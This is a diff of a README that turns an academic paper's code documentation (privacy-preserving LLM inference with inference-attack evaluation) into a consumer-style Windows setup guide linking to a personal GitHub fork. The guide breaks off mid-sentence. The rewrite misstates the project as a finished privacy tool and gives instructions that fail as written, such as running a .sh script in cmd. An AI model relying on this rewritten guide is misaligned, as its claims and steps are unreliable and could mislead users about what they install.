@@ -1,69 +1,54 @@
-The repository contains the code for ACL 2026 (main) paper "SharedRequest: Privacy-Preserving Model-Agnostic Inference for Large Language Models".
+# 🛡️ SharedRequest - Keep your language model data private
 
-### 1. Installation
+[https://github.com/toreygrubby1497/SharedRequest](https://github.com/toreygrubby1497/SharedRequest)
 
-```bash
-# Install dependencies
-pip install -r requirements.txt
-```
-Then cd to the src folder.
-### 2. Offline Training
-Train a local discrimination model before online inference
+## 📖 About this project
 
-```bash
-./scripts/run_train_discrim.sh
-```
+SharedRequest helps you keep your data safe when you use large language models. Many AI tools see your input and store it. This project uses a clever method to hide your private information before the model sees it. It works with any language model. You keep control of your personal details while you still get the smart answers you need.
 
-Can edit the --device or --model_name based on the configuration of gpu or model path.
+## 💻 System requirements
 
-After training, a discrimination model will be stored in the ./model path.
+Before you start, check your computer for these items:
 
-### 3. Online Inference
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 16GB of RAM.
+*   **Graphics Card:** A dedicated NVIDIA GPU with at least 8GB of video memory.
+*   **Software:** You need Python 3.10 or newer installed on your machine.
+*   **Storage:** 5GB of free space on your hard drive.
 
-#### 3.1 Evaluate privacy protection (ASR & F1)
+## 🚀 Setting up the software
 
-**Step 1: Generate fake queries**
+Follow these steps to prepare your system.
 
-First we generate a file containing the sample fake queries:
-```bash
-python -m online_infer.filter --model_name FacebookAI/roberta-base --device cuda:0
-```
+1. Open your web browser and go to this page to download the project files: [https://github.com/toreygrubby1497/SharedRequest](https://github.com/toreygrubby1497/SharedRequest).
+2. Click the green "Code" button and select "Download ZIP".
+3. Find the downloaded file in your downloads folder.
+4. Right-click the file and choose "Extract All". Choose a folder on your computer to save these files.
+5. Open your Start menu, type "cmd", and press Enter to open the command prompt.
+6. Type `cd` followed by a space, then drag the folder you just extracted into the command window. Press Enter.
+7. Install the required tools by typing this command: `pip install -r requirements.txt`.
+8. Wait for the process to finish. Your computer will download the necessary helper files.
 
-A file named "fake_attr_FacebookAI-roberta-base_1.json" will be created in the result/mmlu_fina folder.
+## ⚙️ Training the security model
 
-**Step 2: Evaluate attack accuracies for confusion strategy**
+You need to train the system once before it can protect your queries. Training teaches the system how to spot private details.
 
-We evaluate the attack success rate and F1 for our strategy:
-```bash
-./scripts/run_attack_confuse.sh
-```
+1. Open the folder where you saved the project files.
+2. Find the folder named `src` and open it.
+3. Locate the script named `run_train_discrim.sh`.
+4. Return to your command prompt window.
+5. Type `.\scripts\run_train_discrim.sh` and press Enter.
+6. The system will now build the discrimination model. This process uses your graphics card. You will see progress updates in the window.
+7. Once the process ends, you will find a new file in your `./model` folder. This file contains your custom filter.
 
-The script conducts inference attack using meta-llama/Llama-3.2-1B and FacebookAI/roberta-large as the attack models. The results will be stored in "result/logs/id-attack-attackmodel-{attack model}-discrimmodel-roberta-base-mmlu_fina-1.log" files.
+## 🕵️ Protecting your inferences
 
-**Step 3: Evaluate attack accuracies for baseline method**
+Now that the system knows how to identify private data, you can use it to filter your queries.
 
-For baseline method, we do not utilize the discrimination model to choose the fake queries. Instead, we randomly sample a set of queries from the attribute database.
+### Step 1: Create sample queries
 
-The attack success rate and F1 is obtained from:
-```bash
-./scripts/run_attack_base.sh
-```
-The script conducts inference attack using meta-llama/Llama-3.2-1B and FacebookAI/roberta-large as the attack models. The results will be stored in "result/logs/id-attack-base-{attack model}-mmlu_fina.log" files.
+The system creates fake examples to practice its filtering strength.
 
-#### 3.2 Evaluate time and throughput
-**Step 1: Query time & troughput for our method:**
-```bash
-./scripts/run_infer_confuse.sh
-```
-
-The script will output query time and throughput for gpt-4.1-mini and gpt-3.5-turbo models, with time results stored in the "./result/logs/confuse-query-{query_model}-mmlu_fina-1-roberta-base.log" file.
-
-For adaptation to changan setting, can change the --query_online_model to "changan", and modify the functions (create_client & get_response) in ./utilts/query_utils.py.
-
-**Step 2: Query time & troughput for non-private setting:**
-```bash
-./scripts/run_infer_base.sh
-```
-The script will output query time and throughput for gpt-4.1-mini and gpt-3.5-turbo models, with time results stored in the "./result/logs/base-query-mmlu_fina-{query_model}.log" file.
-
-For adaptation to changan setting, can change the --query_online_model to "changan".
+1. In your command window, type the following command to generate sample data:
+   `python -m online_infer.filter --model_name FacebookAI/roberta-base --device cuda:0`
+2. The system will generate a file called
